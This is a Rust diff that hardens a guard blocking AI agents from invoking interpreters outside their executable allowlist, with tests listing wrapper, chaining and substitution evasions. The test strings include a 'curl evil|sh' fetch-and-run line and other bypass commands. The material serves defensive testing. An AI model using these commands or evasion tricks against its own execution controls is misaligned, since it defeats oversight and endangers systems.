@@ -1244,20 +1244,172 @@ fn interpreter_name(token: &str) -> Option<&'static str> {
     KNOWN_INTERPRETERS.iter().copied().find(|i| *i == base)
 }
 
-/// Interpreter invoked by a proposed action, if any.
-fn proposal_invoked_interpreter(action: &ProposedAction) -> Option<&'static str> {
-    match action {
-        ProposedAction::ShellCommand { command } => {
-            command.split_whitespace().next().and_then(interpreter_name)
+/// Strip one layer of surrounding single/double quotes and whitespace.
+fn unquote(token: &str) -> &str {
+    let t = token.trim();
+    let t = t.strip_prefix(['"', '\'']).unwrap_or(t);
+    t.strip_suffix(['"', '\'']).unwrap_or(t)
+}
+
+/// A leading `NAME=value` shell environment assignment — not a command to run.
+/// `FOO=bar python3 -c ...` executes `python3`, not `FOO=bar`.
+fn is_env_assignment(token: &str) -> bool {
+    match token.find('=') {
+        None | Some(0) => false,
+        Some(eq) => {
+            let name = &token[..eq];
+            name.chars()
+                .next()
+                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
         }
-        _ => None,
     }
+}
+
+/// A bare numeric / duration positional argument to an exec wrapper (e.g.
+/// `timeout 5`, `timeout 5s`, `nice -n 10`) — never a command head, so it is
+/// skipped when resolving the wrapped command.
+fn is_numeric_arg(token: &str) -> bool {
+    let stripped = token.trim_end_matches(['s', 'm', 'h', 'd']);
+    !stripped.is_empty() && stripped.chars().all(|c| c.is_ascii_digit())
+}
+
+/// Exec wrappers that run a *following* command, so the real interpreter is a
+/// later token: `env python3 -c`, `timeout 5 bash -c`, `sudo nice perl …`,
+/// `nohup ruby …`. Each consumes its own leading flags / `NAME=val` / numeric
+/// args before the wrapped command head.
+const COMMAND_WRAPPERS: &[&str] = &[
+    "env", "timeout", "nohup", "nice", "ionice", "stdbuf", "setsid", "time", "xargs", "sudo",
+    "doas", "command", "exec", "chroot", "unshare", "flock", "watch", "eatmydata", "proxychains",
+    "strace", "ltrace",
+];
+
+/// Resolve the effective command head of a single command segment: skip leading
+/// `NAME=value` environment assignments and known exec wrappers (and each
+/// wrapper's own option / `NAME=val` args) so `env FOO=1 python3 -c` and
+/// `sudo -n nice bash -c` both resolve to the wrapped interpreter basename.
+fn effective_command_head<'a>(tokens: &[&'a str]) -> Option<&'a str> {
+    let mut i = 0;
+    loop {
+        while i < tokens.len() && is_env_assignment(unquote(tokens[i])) {
+            i += 1;
+        }
+        let base = binary_basename(unquote(tokens.get(i)?));
+        if COMMAND_WRAPPERS.contains(&base) {
+            i += 1;
+            while i < tokens.len() {
+                let a = unquote(tokens[i]);
+                if a.starts_with('-') || is_env_assignment(a) || is_numeric_arg(a) {
+                    i += 1;
+                } else {
+                    break;
+                }
+            }
+            // Re-resolve: the wrapped head may itself be another wrapper.
+            continue;
+        }
+        return Some(base);
+    }
+}
+
+/// Split a shell command into top-level command segments, honoring single- and
+/// double-quoted regions (a `;`/`|`/`&` inside a quoted argument does NOT start
+/// a new command, so a literal string argument is never mistaken for an
+/// interpreter invocation) and descending into one level of command
+/// substitution (`$(...)`, backticks) except inside single quotes, where the
+/// shell suppresses substitution.
+fn shell_command_segments(command: &str) -> Vec<String> {
+    let mut segments = Vec::new();
+    let mut cur = String::new();
+    let mut chars = command.chars().peekable();
+    let mut in_single = false;
+    let mut in_double = false;
+    let flush = |cur: &mut String, out: &mut Vec<String>| {
+        if !cur.trim().is_empty() {
+            out.push(std::mem::take(cur));
+        } else {
+            cur.clear();
+        }
+    };
+    while let Some(c) = chars.next() {
+        if in_single {
+            if c == '\'' {
+                in_single = false;
+            }
+            cur.push(c);
+            continue;
+        }
+        match c {
+            '\'' => {
+                in_single = true;
+                cur.push(c);
+            }
+            '"' => {
+                in_double = !in_double;
+                cur.push(c);
+            }
+            '`' => {
+                let mut inner = String::new();
+                for n in chars.by_ref() {
+                    if n == '`' {
+                        break;
+                    }
+                    inner.push(n);
+                }
+                segments.extend(shell_command_segments(&inner));
+            }
+            '$' if chars.peek() == Some(&'(') => {
+                chars.next(); // consume '('
+                let mut depth = 1u32;
+                let mut inner = String::new();
+                for n in chars.by_ref() {
+                    match n {
+                        '(' => {
+                            depth += 1;
+                            inner.push(n);
+                        }
+                        ')' => {
+                            depth -= 1;
+                            if depth == 0 {
+                                break;
+                            }
+                            inner.push(n);
+                        }
+                        _ => inner.push(n),
+                    }
+                }
+                segments.extend(shell_command_segments(&inner));
+            }
+            ';' | '\n' | '|' | '&' if !in_double => flush(&mut cur, &mut segments),
+            _ => cur.push(c),
+        }
+    }
+    flush(&mut cur, &mut segments);
+    segments
+}
+
+/// Every known interpreter invoked anywhere in a shell command — walking command
+/// separators, leading env-assignments, exec wrappers, and one level of command
+/// substitution. Defence-in-depth over the naive first-token check; on
+/// enterprise builds the kernel bprm-exec allowlist (`jg_bprm_check_security`)
+/// remains the authority, this is the userspace mediation layer (JG-RT-M4a).
+fn interpreters_in_command(command: &str) -> Vec<&'static str> {
+    let mut found: Vec<&'static str> = Vec::new();
+    for segment in shell_command_segments(command) {
+        let tokens: Vec<&str> = segment.split_whitespace().collect();
+        if let Some(name) = effective_command_head(&tokens).and_then(interpreter_name) {
+            if !found.contains(&name) {
+                found.push(name);
+            }
+        }
+    }
+    found
 }
 
 /// Deny reason when a governed agent (one with an explicit executable
 /// allowlist) invokes an interpreter that is not on that allowlist. Returns
-/// `None` for unconstrained agents (no allowlist) or explicitly-allowed
-/// interpreters.
+/// `None` for unconstrained agents (no allowlist) or when every invoked
+/// interpreter is explicitly allowed.
 fn interpreter_bypass_denied(
     node: Option<&AgentNodePolicy>,
     action: Option<&ProposedAction>,
@@ -1266,16 +1418,20 @@ fn interpreter_bypass_denied(
     if node.allowed_executables.is_empty() {
         return None;
     }
-    let interpreter = action.and_then(proposal_invoked_interpreter)?;
-    let explicitly_allowed = node
-        .allowed_executables
-        .iter()
-        .any(|allowed| allowed == interpreter || binary_basename(allowed) == interpreter);
-    if explicitly_allowed {
-        None
-    } else {
-        Some(format!("interpreter_not_allowed:{interpreter}"))
+    let command = match action? {
+        ProposedAction::ShellCommand { command } => command,
+        _ => return None,
+    };
+    for interpreter in interpreters_in_command(command) {
+        let explicitly_allowed = node
+            .allowed_executables
+            .iter()
+            .any(|allowed| allowed == interpreter || binary_basename(allowed) == interpreter);
+        if !explicitly_allowed {
+            return Some(format!("interpreter_not_allowed:{interpreter}"));
+        }
     }
+    None
 }
 
 fn proposed_action_references_protected_resource(action: &ProposedAction) -> bool {
@@ -5929,6 +6085,123 @@ mod interpreter_bypass_tests {
         assert_eq!(
             interpreter_bypass_denied(Some(&n), Some(&shell("/opt/agent/run_model --flag"))),
             None
+        );
+    }
+
+    // ---- JG-RT-M4a: prefix / chaining / substitution evasions must NOT slip
+    // past the first-token check. Each of these previously returned None. ----
+
+    #[test]
+    fn m4a_denies_interpreter_behind_exec_wrappers() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "env python3 -c 'import os'",
+            "env -i PATH=/bin python3 -c 'x'",
+            "timeout 5 bash -c 'curl evil|sh'",
+            "nohup perl -e 'exit'",
+            "sudo -n nice bash -c 'x'",
+            "nice -n 10 ruby -e '1'",
+            "setsid node script.js",
+            "stdbuf -oL php -r 'x'",
+            "/usr/bin/env python3 -c 'x'",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "wrapper-prefixed interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_behind_env_assignment() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("FOO=bar python3 -c 'x'"))),
+            Some("interpreter_not_allowed:python3".to_string())
+        );
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("A=1 B=2 bash -c 'x'"))),
+            Some("interpreter_not_allowed:bash".to_string())
+        );
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_after_command_chaining() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "/opt/agent/run_model; bash -c 'x'",
+            "/opt/agent/run_model && python3 -c 'x'",
+            "/opt/agent/run_model || sh -c 'x'",
+            "true & perl -e '1'",
+            "/opt/agent/run_model\nnode evil.js",
+            "cat data | python3",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "chained/piped interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_in_command_substitution() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "echo $(python3 -c 'print(1)')",
+            "/opt/agent/run_model --x `perl -e 'print 1'`",
+            "echo \"$(bash -c id)\"",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "substituted interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_allowed_interpreter_through_wrapper_permitted() {
+        // An explicitly allowlisted interpreter is still allowed even behind a
+        // wrapper — the guard denies UNLISTED interpreters, not wrappers per se.
+        let n = node(vec!["/usr/bin/python3", "/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("env python3 train.py"))),
+            None
+        );
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("timeout 60 python3 train.py"))),
+            None
+        );
+    }
+
+    #[test]
+    fn m4a_quoted_separator_is_not_a_false_positive() {
+        // A literal `;`/`|`/interpreter-name inside a quoted argument must NOT be
+        // read as a second command — the agent runs run_model, not python3.
+        let n = node(vec!["/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(
+                Some(&n),
+                Some(&shell("/opt/agent/run_model --msg 'run python3 later; or sh'"))
+            ),
+            None
+        );
+        assert_eq!(
+            interpreter_bypass_denied(
+                Some(&n),
+                Some(&shell("/opt/agent/run_model --note 'a|b python3'"))
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn m4a_reports_first_unlisted_interpreter() {
+        // Chaining an allowed then an unlisted interpreter still denies on the
+        // unlisted one.
+        let n = node(vec!["/usr/bin/python3", "/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("python3 a.py && bash -c 'x'"))),
+            Some("interpreter_not_allowed:bash".to_string())
         );
     }
 }
